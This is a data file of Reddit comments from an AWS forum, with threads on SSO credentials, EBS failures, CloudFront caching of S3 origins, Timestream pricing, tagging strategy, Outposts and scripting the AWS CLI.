g7a3wvw,j3630o,"For user access to the Console and CLI we use our Azure AD as an SSO provider.

For use within the EC2 environments we use Instance Profiles with least access permissions.

For everything else we have read-only IAM credentials, also with least access permissions.

I’ve seen a lot of organizations using Hashicorp Vault as a sort of STS token vending machine.

I’ll check out your tool. I like that it’s multi-cloud. :)",3.0
g7aa0xe,j3630o,"exactly our goal with the Tool, we will support AWS SSO, for now, GSuite only.  


The idea is to help DevOps that are working in Multi-Cloud",1.0
g7cboow,j3630o,"AWS SSO, no need for any other tools anymore. AWS SSO can use directory from GSuite, AzureAD (basically all SAML IdPs) and Active Directory itself. The aws cli supports getting temporary credentials with AWS SSO natively.

Basically all 3rd party tools on the market for managing AWS access have now lost and are useless.",2.0
g7drxbp,j3630o,"I don't think so, Leapp is going to integrate with AWS SSO and he's going not only to manage Credentials in a better and secure way, but it enables also other common features.  
Like enabling the access to EC2 instances through SSM in a click

How do you manage every call with AWS SSO if you have multiple profiles? every time you have to point out which profile are you using?",1.0
g7dsabb,j3630o,"And with a tool like Leapp, you can assumeRole from an AWS account to another, that is an essential difference from AWS SSO, so if you are a consultant or you have to access to other account not in your organization you can assume role from your organization through STS",1.0
g7a3ao5,j34hpt,"Bring up a fresh EC2 with a new root volume and Mount the EBS as a secondary drive.

You can then poke around on your “frozen” EBS.",1.0
g79y68z,j34hpt,Raise a support ticket as I doubt there is anything you can do.,1.0
g7ajgvo,j34hpt,"Also worth noting is that, going forward, you will need to plan for this happening again. With the exception of IO2 volumes the expected failure rate for EBS is significant. Quoting the AWS docs:

&gt;All other Amazon EBS volumes are designed to provided 99.8%-99.9% durability with an AFR of between 0.1% - 0.2%

In other words, if you have a thousand EC2 instances with 10 volumes each, you'll lose one every couple of weeks. Their documentation appears to be a bit pessimistic (or we've been lucky), in practice the AFR is 5-10x better, but if you have enough of them your EBS volumes *will fail* at some point.",2.0
g7b8z5c,j34hpt,"The docs are extremely pessimistic. If 0.2% of EBS volumes were lost per year, you'd hear about it in the news :)

Also, lost volumes will go in to an 'error' status and won't be attachable. This is a different behavior, but we also don't know what they mean by frozen.",2.0
g7ebkvn,j34hpt,"They don't always enter an 'error' state immediately, so this might have been a case of a failed volume. But yes, in practice failures happen a lot less than the docs say. And any company that uses enough of them to make this an issue will probably be treating their EC2 instances as cattle and not care about losing one every now and then, so you're unlikely to hear about it.",1.0
g79s7iv,j32gpz,"For our usage I figured which services, ie ECR, S3, Logs, were costing a ton in NAT so switched to VPC Endpoints.
It is really expensive for what it is but heh ...
NAT managed is great but costs for same traffic is cheaper via endpoint says my bills...",2.0
g7asq35,j32gpz,"I went back and redid my calculations because I realized I didn't give them a fair comparison. I was considering equal data across every endpoint which isn't going to be the case.

If you up it to a terabyte of data per NAT, and split it evenly across the VPC endpoints (for my case 250GB per endpoint) for a total of a terabyte, we get 155.88 USD vs 78.40 USD respectively.

So yeah, once you get past the overhead of the endpoints, and actually use the same amount of data to compare, I do think there is something there.",1.0
g79p6bj,j34f1v,RemindME! 10 hours,1.0
g7b930d,j32am0,"I'm having a surprising amount of trouble trying to interpret your question, but I *think* I know what you're asking, so I'll take a crack at it; if my answer doesn't explain it, feel free to reply and ask more questions.

----

Requests to S3 origins are not covered by CloudFront as you're sending a request directly to S3. CloudFront and S3 are entirely separate services, however they can interact with each other and do so quite nicely.

When you send a request directly to an S3 URL, such as `https://tycoon-example-bucket.s3.amazonaws.com/object.txt` or `https://s3.amazonaws.com/tycoon-example-bucket/object.txt`, requests are sent directly to S3 within AWS datacenters, bypassing CloudFront entirely. CloudFront doesn't ignore the request to S3 so much as it never realizes it happened. Since your request never goes to a CloudFront domain, it never reaches a CloudFront Edge Location that would serve your request (and fetch the object from S3 if need be). You're basically sending a request directly to an AWS regional datacenter (i.e., one of the datacenters that manages the `us-west-2 (Oregon)` region) which will then process and route your request internally as needed.

By contrast, if you send a request to a CloudFront Distribution URL, such as `https://d1234567890ab.cloudfront.net/object.txt`, you *are* sending to a CloudFront Edge Location, as the domain is routed via Route53 to the edge location with the lowest latency to you (likely the one physically closest to you). Since CloudFront *does* see this request, it can therefore process the request, retrieve the object from S3, then cache it and send it back to you. In this case, there will be times where S3 never realizes that your request happened, as whenever the object is cached in CloudFront, CloudFront simply serves the object out of its cache instead of making a request to S3 on your behalf.",1.0
g7chpnl,j32am0,"Thanks for the reply.

I have this question when reading the [CloudFront FAQ](https://aws.amazon.com/cloudfront/faqs/): 

&gt;**Q. How does regional edge cache work?**  
&gt;  
&gt;Amazon CloudFront has added several regional edge cache locations globally, at close proximity to your viewers. They are located between your origin webserver and the global edge locations that serve content directly to your viewers. As objects become less popular, individual edge locations may remove those objects to make room for more popular content. Regional Edge Caches have a larger cache width than any individual edge location, so objects remain in the cache longer at the nearest regional edge caches. This helps keep more of your content closer to your viewers, reducing the need for CloudFront to go back to your origin webserver and improving overall performance for viewers. For example, CloudFront edge locations in Europe now go to the regional edge cache in Frankfurt to fetch an object before going back to your origin webserver. Regional edge cache locations are currently used only for requests that need to go back to a custom origin; i.e. requests to S3 origins will skip regional edge cache locations.

The last sentence states that requests to S3 will skip regional edge cache, don't know the reason behind it.",1.0
g7con1k,j32am0,"**Tl;dr**

CloudFront regional edge cache locations and global edge locations are different, and only one or both may be utilized depending on your setup. Global edge locations will always be used; regional edge locations only if you have custom origins. There's likely a reason for this, even if AWS doesn't want to tell us. Nonetheless, if you're worried about your requests bypassing CloudFront servers entirely and always hitting your origin server, rest assured that CloudFront will still cache files from your origin, regardless of whether or not it uses regional edge cache locations.

----

Based on my (fairly little) knowledge of CloudFront, this is what I think:

CloudFront is somewhat of a ""layered"" network, in that each location that gets ""closer"" to an AWS regional datacenter (i.e., the datacenters that serve the `us-west-2 (Oregon)` region that actually hold objects stored in S3) has a larger amount of available space to cache files.

When you make a request, CloudFront routes your request to its nearest global edge location, the server that will actually serve the request back to you (or your viewers, for that matter).

Once your request gets to the global edge location chosen, that edge location will check its cache for the files requested; if they're present, it'll serve them back from its cache and no further requests are made. If those files are not present, the global edge location will do one of two things:

1. If you're using a custom origin (i.e., you're caching `https://example.org/`, that global edge location will make a request to its associated regional edge cache location (I simplify these to ""regional edge location""). That regional edge location will make the same check for the files you requested. If they're there, it'll serve them back to the global edge location, which will cache them and then serve those files back to you. If the regional edge location does not contain the requested files, the regional edge location will make a request back to your origin server; your origin server will serve the files back to the regional edge location, which will then serve them to the regional edge location, which will then serve them to you. **Note that this only happens if you're using a custom origin.**

2. If you're not using a custom origin (i.e., your origin is an S3 bucket), the global edge location will make a request over AWS's network backbone (basically the connection between all of AWS's datacenters) to the associated regional datacenter (i.e., any of the datacenters in the `us-west-2 (Oregon)` region). That regional datacenter will serve the request back to the global edge location, which will then cache the file and serve it back to you. Regional edge cache locations are not used for AWS origins; only custom origins.

Also note that regional edge locations are not global edge locations: regional edge cache locations serve global edge locations; global edge locations serve viewers.

CloudFront does its best to keep you within AWS, including their network backbone. Since custom origins are outside the AWS network, CloudFront has to fetch files on custom origins via the public internet, and the connect between your custom origin server and a CloudFront edge location is likely slower (both in throughput and latency) than a connection between AWS datacenters over their network backbone. Thus, CloudFront tries to keep requests it serves within AWS as much as possible, reducing latency and increasing throughput overall. Since origins like S3 are already on the AWS backbone, global edge locations don't need to go to a regional edge cache location for files, they just go to the S3 bucket holding the data whenever needed.

There's likely lots of thought and engineering that went into designing CloudFront and how it would utilize regional edge cache locations. I can't say for certain, but with origins that are already on AWS (such as S3), it was likely thought that there was no need to cache copies in regional edge cache locations when files are already within AWS. If the file is within AWS, its accessible anywhere within its network and there's no need to cache it more than necessary. With custom origins, the connection to the origin is unknown, so caching files from it can be more beneficial.

The last two paragraphs are somewhat speculative on my part, for which I apologize. I was able to come up with multiple reasons why they might want to cache (for example) objects from S3 in regional edge locations, and reasons why they might not want to. Nonetheless, know that the *was* a reason behind it and that the people who design AWS are smart and know what they're doing and why they're doing it a certain way.

If you're worried about requests not getting served from CloudFront's cache, then don't be; CloudFront will still cache files served from any origin at its edge locations.",2.0
g7hq88p,j32am0,"&gt;if you're worried about your requests bypassing CloudFront servers

I'm not worried about it, just curious why they design the regional edge location like this 🙂 

I think you are right, S3 are already on the AWS backbone, so don't need to store in regional edge cache. Thanks for the detailed explanation!",1.0
g790adz,j3006q,"Super common. 

Best way to do this is:

- Create a subdomain zone in each child account (dev.company.com)
- Add the name servers to a record in main account
- each child account should update the respective zone in that account. That means you’d be creating resources and DNS that should look like :  myelb.dev.company.com 

Very rarely you shouldn’t want to have resources in child account need to access main R53. The use case can usually be solved by re-architecting your design which usually improves isolation",3.0
g79bmos,j3006q,And for certificates just use ACM,1.0
g7pfooq,j3006q,Thank you. Let me work on it,1.0
g7a9031,j30fkt,Why do you want to use Sagemaker to host your application? Sagemaker is managed machine learning platform.,2.0
g7afy46,j30fkt, I currently have a Python Flask server that takes in data from the node app and returns an output after analyzing it with a ML algorithm. Do you think it would be better to leave it in a pytho file or migrate it to sagemaker? And how would I use ELB with that,1.0
g7939kp,j2zzib,"Make using network appliances more seamless. It’s a pain now with managing HA, routing, failover, ALB sandwiches, etc. it’s all too much work.",3.0
g7974c4,j2zzib,\+1 to this.,1.0
g79fj7p,j2zzib,A managed service of something like Squid Proxy,2.0
g79jtrd,j2zzib,Bake it into NAT gateway and you'd really have a winner.,4.0
g7a5kd3,j2zzib,Aurora for SQL Server (for cheaper instances),2.0
g7by2f3,j2zzib,There are some managed services I know they’re working on that I’m very interested in.,2.0
g7ce79e,j2zzib,no spoilers (NDA) but I'm looking forward to finding out in 60 days :),2.0
g78w172,j2zzib,"Increased maximum event limit for Step Functions so I don't have to ""Continue as new"" for large batch processing.",1.0
g7976of,j2zzib,Better orchestration / automation tools. Even AWS own adaptation of terraform or ansible,1.0
g7bpwtm,j2zzib,"I know its not what OP asked, but Hashicorp has a new OSS product on its way. Here's hoping its their own configuration management tool. Wouldnt that be amazing",1.0
g7bs8tf,j2zzib,Aurora access outside vpc without the need for vpn or 3rd party tools,1.0
g7bpbmd,j2zzib,"AWS Lambda with configurable network, CPU and mem.",1.0
g78x0xx,j2zgqh,Have you tried using the search bar?,2.0
g78yu85,j2zgqh,"\+1 

yup, that's a simple solution :)   
If the title doesn't have the keyword, then it'll not appear in search",2.0
g78zgvp,j2zgqh,"Hi - I’m one of the new mods here. 

How about enforcing tags on posts? Any thoughts on that? 

Open to ideas/suggestions",2.0
g79ufob,j2zgqh,"Yup, like this. But tags are fixed or any can create new tags?",1.0
g79ypj2,j2zgqh,I imagine we'd come up with some fixed amount of tags. Perhaps the same ones that Amazon uses to group their products and then some 'general' ones as well?,1.0
g7aglw5,j2zgqh,"Yup, fixed tags are good.",1.0
g7acmiy,j2zgqh,"I’m thinking an ingest/index solution using APIGW, Kinesis, Elasticsearch, Dynamo and RDS...

No?  Too much?  :)",2.0
g7bhrpn,j2zgqh,"Maybe not enough...  if we don't utilize every viable service, how can we ensure it's robust enough to handle the massive load we're sure to put it under?  How would we be able to look at ourselves in the mirror ever again?",1.0
g7bi55u,j2zgqh,God help us...,1.0
g78rxew,j2zfm3,"Try this:

1) Go to your ALB and click Listeners

2) You should have two listeners, HTTP and HTTPS. Delete the HTTP listener

3) Create a new listener for HTTP

4) Set the Default Action to Redirect To HTTPS:443 with ""Original host, path, query"" selected.

Save the listener, now any requests that hit that HTTP listener will receive a redirect to HTTPS.",4.0
g78tka6,j2zfm3,That worked thanks! I didn't realize I had to go outside of EB,2.0
g79bv60,j2zfm3,"I've not used EB so I'm not sure if there's a more ""recommended"" method, but glad you got it working :)",2.0
g79ucqa,j2yz2v,I’m super excited about this. I’ve setup time series in the past using RDS and always wanted it to be more cost-efficient.,3.0
g7ab5t0,j2yz2v,Does timestream win for longest time from announcement to GA? Was [announced](https://aws.amazon.com/about-aws/whats-new/2018/11/announcing-amazon-timestream/) at re:invent 2018. Has anything taken over 22 months from announcement to GA?,1.0
g7c676m,j2yz2v,Im pretty sure it does!,1.0
g78kvbj,j2ycqx,https://cloudinit.readthedocs.io/en/latest/topics/format.html and read cloud init logs. “It doesn’t work “ is a dumb question,2.0
g79dqe7,j2ycqx,"If something is not working you can check logs.

[https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/user-data.html)",1.0
g7a5fmp,j2y0gu,"Are you interacting with AWS resources directly, or are you trying to password protect a Vercel project site?

If the latter, you should contact Vercel’s support.",1.0
g79opqr,j2uikn,"https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_examples_dynamodb_rows.html


https://aws.amazon.com/blogs/mobile/building-fine-grained-authorization-using-amazon-cognito-user-pools-groups/


You can set the partition key for your table to equal the Cognito sub. Then, in your IAM policy,, use the LeadingKeys condition to indicate that the provided key should equal the user's Cogntio sub. The second link gives a step by step guide.",1.0
g7ab0c0,j2uikn,"Thank you, these are great resources.

Let's say I update the role of my users group to restrict their access to keys that contain their Cognito sub.  How does the lambda, which has it's own separate set of permissions(e.g. read/write access to DDB), know about the users permissions (read/ write access to a specific key)?

I'm unclear how to the users IAM role applies from within the lambda execution.",1.0
g7atseq,j2uikn,"https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-integrate-with-cognito.html

The general answer is that you'll need to add an authorizer to each of your rest endpoints and use the AWS SDK in your lambda to apply the authorizer. Read through this link and the Topic links at the bottom of the page on how to integrate and call your rest API with Cognito as the authorizer.",2.0
g7exv61,j2uikn,"Thank you for your insights, and confirming that I'll need to manually use the SDK from within my lambda code.  I had hoped it would be a bit more straightforward to apply IAM roles to the lambda execution environment.  


Authorization based on user roles seems like such a common use case, I'm a bit surprised it's not better documented *or* easier to implement.  It makes me wonder if  there are preferred methods to enforce user roles from within my lambda code!",1.0
g7ezndw,j2uikn,"Glad I could help. I know you said you are using Serverless FW (which I admittedly don't know much about), but AWS Chalice is a great framework for serverless integration, particularly for your use case. 

Once you have Cognito configured, you can use Chalice to very easily apply your Cognito authorizer to your routes. If you have used Flask/Django before, then Chalice will be a breeze because it has extremely similar syntax and functionality. You can setup your routes/endpoints in your code and Chalice will deploy the necessary Lambda/API Gateway. You can even set IAM from within your Chalice project. Overall, are a lot of other great features on Chalice that help integrating with other AWS services.

Here's a link to the Chalice docs that shows how easy Cognito integration is. Also, I suggest just browsing the rest of the docs to get a better understanding of all of the features.

https://aws.github.io/chalice/topics/authorizers",1.0
g78feca,j2x9n0,"Yes, there is an impact, but it sounds like in your situation the actual effect will be minimal. Since the visitor will have to connect all the way back to the S3 bucket anyway (if you didn't have CF), it's likely the Amazon's connection from the closest POP back to the S3 bucket over their backbone will be faster anyway.",8.0
g794qrn,j2x9n0,"I wouldn’t stress. In fact, latency can be improved using CloudFront even when caching is outright disabled, because:

- Once a client request hits a CloudFront edge node, it will take the optimal route through AWS’ backbone to S3. If the client request is sent directly to S3, it’s going to be sent “over the internet” to the AWS region where the bucket is located. 

- SSL negotiation can be relatively expensive due to the number of back and fourth requests needed for a handshake. When you are using CloudFront for HTTPS, the client will establish a secure connection using the edge server closest to their location",5.0
g7adyu1,j2x9n0,"The only thing i would add about this: I'll worry a bit more for cache invalidation, if you have a site with low traffics (and  maybe a low budget), and a lot of releases, cache invalidation can add up to the total cost.",1.0
g78gfll,j2wz4x,Anybody used this _in anger_ yet? Keen to hear first-hand impressions.,25.0
g78n91p,j2wz4x,Its a shame that you can't backfill old or missing data.,10.0
g78o93l,j2wz4x,"yeah, it seems you can only backfill data stored in the memory partition, and keeping an extended memory partition would be really expensive",2.0
g78q9lh,j2wz4x,"50GB worth of in memory is $1200 a month, not terrible but what if you need to backfill more than that due to a cellular network issue?",1.0
g7amis4,j2wz4x,You can. But as others mentioned only so much back in time what you configure as TTL wich has a maximum of 12 months. So for now you can only backfill a year of data when it comes to time. And the size of your Memory partition when it comes to storage.,1.0
g794zno,j2wz4x,"**EDIT: The below is no longer accurate. They've updated their example with correct numbers, mostly to use 200 EC2 instances instead of 100, which explains most of the mismatches. My math now agrees, the only other discrepancy in the work below being they do actually use 1024 KB=1MB and 1024 MB = GB.**

Is my maths bad or are the pricing examples [on the pricing page](https://aws.amazon.com/timestream/pricing/)completely wrong? x-posted to HN:

From the example: *""Writes cost: $ 8.64 per month. This is computed as: ( 2 writes * 100 EC2 instances * 60 minutes * 24 hours * 30 days) * $0.50/ 1 MM writes""*

But I get $4.32 from ((2 * 100 * 60 * 24 * 30) * 0.5) / 1M

From the example: *""Memory store cost: $ 3.55 per month. This is computed as: ( 2 KB per minute per instance * 100 instances * 60 minutes * 6 hours * 30 days) * $0.036 / GB-hour.""*

For starters I think there needs to be another ""* 24 hours"" in there - the 6 hours is to account for the retention period, but they're storing that 24 hours a day...

But even with that I get $1.87 for the memory store from ((2 * 100 * 60 * 6 * 24 * 30) / 1000000) * 0.036 (the div by 1M is to convert KB to GB)

From the example: *""Magnetic store cost: $ 5.93 per month. This is computed as: (2 KB per minute per instance * 100 instances * 60 minutes * 24 hours * 30 days * 12 months) * $0.03 /GB-month.""*

But I get $3.11: ((2 * 100 * 60 * 24 * 30 * 12) / 1000000) * 0.03

From the example: *""Query cost (alerting queries): $ 7.03 per month. This is computed as (10 MB per alerting query * 100 queries per hour * 24 hours * 30 days * $0.01 / GB). Alerting queries process 5 minutes of data. 5 minutes of data is 1 MB (2 KB per minute per instance * 100 instances * 5), which gets rounded up to 10 MB minimum charge for queries.""*

But I get $7.20 from (10 * 100 * 24 * 30 * 0.01) / 1000 (MB -&gt; GB)

It's only on the ""Query cost (ad-hoc queries)"" that I can make the answer agree.",9.0
g78jf7k,j2wz4x,"Been waiting years for this to release, excited to try it!  Hopefully it was worth the wait.",6.0
g79d8u8,j2wz4x,CloudFormation support? 👀,7.0
g79fn9q,j2wz4x,"It's mentioned in the announcement, but unable to find any docs.",3.0
g79p3ek,j2wz4x,"They’ll be updated soon then. The blog, console white lists and docs are all separate teams and deployment systems. So they never happen at exactly the same time.",3.0
g79fi0y,j2wz4x,"Hmm, no direct prometheus support",6.0
g79po62,j2wz4x,They've had a feature request for this that they closed saying that it's up to someone else to implement a connector. No progress has been made afaik. https://github.com/prometheus/prometheus/issues/5086,5.0
g79p8lw,j2wz4x,CDK support?,2.0
g7bmm7e,j2wz4x,Will arrive shortly after Cloudformation support is released.,2.0
g786dt0,j2vto0,"&gt;tags can be inconsistent and unreliable.

So what you have here is a policy and procedure problem, not a technical one.",22.0
g78621u,j2vto0,"&gt;For example, which are SFTP servers, which are pipelines, which are web servers, etc.

You set tagging and instance naming conventions and expect (or enforce) that the people deploying these resources adhere to them.

For example, we use a defined naming standard for all instances created -

{env}-{vpc}-{application}-{service} e.g. p-vc-audience-api is the prod api layer for the GitHub project named 'audience', in our primary vpc. All resources associated with this service have a similar naming convention; elbs (p-vc-audience-api-lb), asgs (p-vc-audience-api-asg), launch configurations (p-vc-audience-api-lc), etc. It makes it easy to know what belongs with what.

We also have standard tags that include -

* Application
* Service
* Environment

You could add team/owner, etc as you need..",3.0
g78wplq,j2vto0,"Are you enforcing the naming convention programmatically somehow? How do you ensure that resources that are created adhere to the convention?

We could publish conventions but having people follow and enforcement is a challenge. We'll spend a lot of time chasing down people to tag their resources correctly.",1.0
g79347j,j2vto0,"Each project has one or more associated configuration files with metadata about the environment, application, service, etc (we give lots of variables to the eng teams to control the resources used). That configuration file goes through peer review and is only approved if the conventions are followed. From there, the deploy is all automated so the conventions are enforced when the resources are all created. 

The key part is the peer review and everyone understanding that’s the right way to do things. The unspoken threat is that if things aren’t right, the deploy could fail or we could manually shut down non-compliant resources. Never needed to though and we have strong buy-in from everyone at this point because the process and consistency has made their lives a lot easier too.",2.0
g79tp16,j2vto0, Managing across accounts and regions can be challenging. We have built a simple solution that customers are using to accomplish just this (view all the EC2 instances running at any given time and turn them on or off on demand without having to manually switch to the organization account). The platform is fully hosted and SaaS based. And you can achieve all this using the free tier. Happy to share more about our solution if you'd like via a PM. You can read more about it here: [https://www.montycloud.com/day2-discovery-and-classification/](https://www.montycloud.com/day2-discovery-and-classification/),3.0
g7855s1,j2vto0,"There’s an iam policy you can do to force all ec2 launches with a specific tag key, such as purpose. Vets this pretty well for all new instances. From there you gotta backtrack manually and get leadership buyin.",2.0
g788rsx,j2vto0,"&gt; Do I just need to shore up my tags? 

Yes  
And stop building your environment manually, tools like terraform make automatically assigning tags trivial  
On top of that, thorough documentation of environment tags, owners, and forcing owners to verify the environments on a semi-regular basis  
Automated documentation helps here too",2.0
g78cu8z,j2vto0,"Terraform and similar tools are only as good as the input you send them, the documentation and policy come first.",3.0
g7a1as6,j2vto0,"agreed, but they make enforcement much easier than doing every box as a snowflake  


we added some code in terraform that enforces certain tags be added in the modules, if they don't exist it refuses to run, that all but ended the issue, sure sometimes a set of servers gets assigned to the wrong project but that's a lot less frequent than when it was being done all manually",1.0
g78wynj,j2vto0,What do you mean by automated documentation?,1.0
g7a26rs,j2vto0,"crawl github for half an hour, there's a ton of projects that create documentation about your AWS environment  


we wrote a few lambdas that run weekly that crawl our AWS environment and create and update confluence documents in a specific space, adds for example; pages per resource like each instance in ec2 gets a page with some human readable useful info from it's describeinstance info with the server's tags set as confluence labels, each tag/label gets a page listing the resources that have that tag/label, resources are listed on an index page per project and sub-product (i.e. sites and related sites)  
like an executive summary version of the management console broken down by project  


the one we still haven't gotten working cleanly is a cost estimate for a project month over month but that's still on the roadmap for Q4",1.0
g789h2m,j2vto0,For cost Explorer activate cost tagging allocation and level up your tag strategies. Also look into tag policies on AWS Organizations.,1.0
g796wtd,j2vto0,"Make sure all infra is created through IaC. Enforce a tagging convention for each resource being created through IaC.

You could use AWS config and its resource group functionality to create groups per service or application stack.

Use third party tools like cloudcraft, jupiterOne, fugue etc to visualize your infra at runtime.",1.0
g7a8ap6,j2vto0,"Check out Cloudcheckr if you've not come across it. 

https://cloudcheckr.com/solutions/resource-inventory-and-utilization

Incidentally they can not only identify security issues but also proactively suggest areas for cost savings, so unless you have very active management of the applications already, it will very likely more than pay for itself.",1.0
g7afc8i,j2vto0,"Using the (legacy) Cost Detail Reports can be helpful in ways Cost Explorer is still not. In particular, it will show you who created every billed resource (as long as you’re properly using IAM). You can then group based on that in Excel (or another tool) and start following up. Get the individual owner of the account, or the manager of the group using the account (if neither are you) to start knocking on doors asking for resource justifications.

Look for EC2 instances that aren’t running. Those are still costing on EBS and potentially EIPs. Look at how long they haven’t been running. Start with those sorts of clearly-not-in-use things as you build a strategy to tackle the clearly-in-use resources.

It may go without saying but - don’t delete anything without confirmation from a resource owner or their manager. Just because an RDS instance is in a VPC with no peers and no EC2 instances doesn’t mean it’s not serving a purpose. It may be a read replica in a far flung place for backup.

If you have users who are setting things up and just leaving them running and it’s creating a big bill, then be up front about how much it is costing the company. You don’t have to be adversarial, but experience has taught me that people who don’t handle the billing or account management side _generally_ have a really deflated sense of costs in the cloud. Plenty of accomplished and otherwise quality developers and sysadmins are blindly following walkthroughs and reference architectures to get things running.

Other comments here about IaC are spot on. Manual work is always unavoidable, but just because something isn’t automated now doesn’t mean it can’t or shouldn’t be. As others have said, tagging policies are your friend. They enforce tagging standards.

Look for repetitive use cases. Combined with IaC, you can boil down repetition to a service catalog (AWS Service Catalog or another solution) and create a really smooth, policy compliant way to create and deploy resource stacks.",1.0
g78l23f,j2vkja,"I still wonder who has one of these running, while having proven the investment worth it ...",21.0
g78vkyj,j2vkja,"With data transfer being a big cost for many companies, I can see how this can be a big cost saving from that perspective",10.0
g79n9xk,j2vkja,But then why use Amazon?,5.0
g79y9e1,j2vkja, The og reason: no one is getting fired for buying IBM. (yes I am old),7.0
g791k98,j2vkja,I have a number of clients in the healthcare space that enjoy these. It just depends on the amount of data you are processing. Imagine processing petabytes of locally stored historical record data into the cloud. It becomes very fast and cost efficient. Are there cheaper routes to store large amounts? Absolutely. But cost isn't the entire consideration by any means for some clients.,6.0
g79xe4a,j2vkja,"The typical use cases revolve around the need to have very low latency from the point of use to your compute and storage resources.  Examples would be to manage and monitor machinery on a shop floor or animated video/CGI production for a movie or game.  Think in terms of milliseconds making all the difference in the world.

Another use case would be that you have a requirement where you don't want the data literally off-prem for some reason.  Could be regulatory (doubt it), but most likely there is a level of sensitivity such that it is worth it to a customer.  A high speed trading house could have their proprietary algorithms on-prem in AWS infrastructure and manage their other business operations in a traditional region/AZ.  

Imagine you are in charge of IT at your country's Antarctic research base.  Outposts would be a great way to bring the benefits of the cloud to you since the Cape Town region is a bit too far away.  Same would apply for North Korea, but I think there would be too many export controls for that to happen.  /s",3.0
g7wf8i6,j2vkja,"This is AWS marketing. I am not asking ""how did the CIO get sold into buying these"", I am asking ""who could provide some measured data ref ROI (these are not cheap!) and vis-a-vis benefits that I have only seen in Powerpoint""?",0.0
g78v5s1,j2vkja,Also curious,1.0
g798s16,j2vkja,Doing some back of napkin math. I calculate it’s x6 more expensive to run AWS in prem rather than on the AWS cloud (not counting power and cooling needs). I think this would be perfect if you’re moving services off of AWS to on-prem.,5.0
g7a1ya2,j2vkja,"The cost of S3 on outposts is disappointing. Until they bring that down, Cloudian is a much more cost effective solution. That said, scale definitely matters, and lots to consider, but overall S3 on outposts costs are disappointing. $100/TB. Wow.",1.0
g78v85z,j2vkja,Why use Amazon for onprem when On prem without Amazon is cheaper and just as scalable?,-5.0
g794emk,j2vkja,"Amazon for sure is great in simplifying some of the infra management. It can be much cheaper too if the usecase is clear and used for specific purposes. So let's say I moved all my workloads to AWS Region but some can't be due to regulatory or security reasons, yeah outpost makes lot of sense.",5.0
g79qoit,j2vkja,"Yeah, this is the value no one is mentioning. For companies working at really large scale, it can be really useful to ditch/reduce on-prem-specific tooling and just pretend everything's an EC2 instance.",3.0
g7a788k,j2vkja,Absolutely. You get the bonus of code reuse and a common deployment model.,3.0
g78y40d,j2vkja,[deleted],1.0
g7917e4,j2vkja,Makes no sense.,-6.0
g793tgj,j2vkja,"The speed of light is fixed, so information takes time to get from point A to point B.  If you're writing an application that needs to work fast (dunno, say controlling some sort of industrial machine), you don't want to add 20ms to travel to the closest AWS AZ - you want to be able to run your code as close as possible.  

So you get an AWS Outpost, which behaves just like an AWS region, and you launch your application/processing/storage services feet away from your machine, vs hundreds of kilometers.  Your developers dont need to try and understand the differences in deployment.  your DevOps/SRE folks don't need to worry about differences.  You  don't need to have a team of people who source hardware, maintain hardware, etc.  You just pay Amazon, they ship you the rack, you plug in power, network, make sure the front is cool, and now you can run stuff in your factory that is super low latency.

Or, as an alternative use case - maybe you have data that you don't want to leave your premesis - financial data, customer data, health data.  Maybe you live in a country that doesn't have an AWS region yet.  So you do some shopping on Amazon, order some racks, and now you can have all the features of AWS, but also keep your data in country and stay compliant.

There are lots of other use cases, as /u/t997 suggested, with Wavelength for example.

&amp;#x200B;

The long and the short is - AWS is bringing all the major features of the cloud into customers datacenters to fulfill their needs.  If it fulfills your needs, great.  If it doesn't, don't buy it/don't use it, just like you're unlikely to use all 180+ AWS services.  But there are DEFINITELY industries that are all over this use case.",2.0
g7949q2,j2vkja,WL makes no sense at all. That's actually a not very well thought from AWS. It might be somewhat useful in Americas / American telcos but rest of the world - It's more of hype.,-6.0
g795yzb,j2vkja,Which Onprem without Amazon method supports spinning up 200 instances during peak hours? Your argument is like saying “it is much cheaper to buy servers and run them in basement in the long run”. Good luck scaling that up.,-1.0
g79lfs3,j2vkja,"The kind where you have an extra 200 instances worth of servers?

Putting them in a box labeled Amazon doesn't change the laws of physics. You still need an extra 200 VMs' worth of resources if you want to start 200 VMs.",2.0
g7ad6uo,j2vkja,"The scale up argument is ridiculous, there are so few businesses that require true scaling up capabilities.",0.0
g7agwb0,j2vkja,Do you have support for that statement?,1.0
g7bbvak,j2vkja,"Yes? I work in the industry lol. Most businesses are quite static, and scale in time with planning.",0.0
g7chbph,j2vkja,"I guess you just don’t have experiences with using cloud. Good luck spending thousands of dollars to set up servers, racks, ups power supply, etc.

Oh one of the hard drive failed? Good luck replacing that.

Moving to cloud saves so much labor hours that you aren’t capable of comprehending.",1.0
g7cndk7,j2vkja,"Lmao. I do, and apparently you don’t have data center experience lol.",1.0
g7heu94,j2vkja,"Not 1,000s but 10,000s minimum in addition to a team of skilled engineers but then you will actually get a more secure reliable solution than AWS. The only thing I like about AWS is the scalability but the cost is horrendous.",1.0
g788u04,j2uwu5,"Just use the aws cli and you're good to go. https://docs.aws.amazon.com/securityhub/latest/userguide/finding-retrieve-api-cli.html

If you can process JSON or YAML you're done. Otherwise just pump it into any JSON to CSV converter online.",1.0
g7adhi3,j2uwu5,"Take a look at my repo [https://github.com/DJGits/aws-securityhub-data-visualizer](https://github.com/DJGits/aws-securityhub-data-visualizer) 

All you have to do is dump findings in the json format and refresh the excel file! 

Let me know if you find it useful.",1.0
g786r5t,j2und0,Sounds like a software development project. What’s AWS have to do with it?,2.0
g787cjc,j2und0,Does AWS amplify have tools that I can use to complete this?,0.0
g787qr9,j2und0,I’m sure it can run whatever software you write for this.,2.0
g77xjf3,j2ug8d,Linux shell script or windows powershell .. or you can use AWS SDK,2.0
g78131h,j2ug8d,"So, there is no simple way to just save the AWS CLI  interactive commands into a file and have it run?

I don't know how to create Linux shell scripts.  I just need to copy some files from a local folder to an S3 bucket on a regular schedule.

Seems like it shouldn't be this difficult.",-2.0
g783b71,j2ug8d,"With Linux or MacOS it is pretty easy to create BASH scripts. Say you want a script to sync two s3 buckets, you would just write it like this:

*#!/bin/bash*

*aws s3 sync s3://mysourcebucket s3://mytargetbucket*

From there, save it as a file (myscript.sh) and run this command to make it executable:

*chmod +x myscript.sh*

Then run it like this:

*./myscript.sh*",3.0
g783zoh,j2ug8d,"I only have Windows.  No Mac or Linux.

I don't know any programming.",-1.0
g784xec,j2ug8d,https://aws.amazon.com/powershell/,1.0
g786rsh,j2ug8d,Batch File then.,1.0
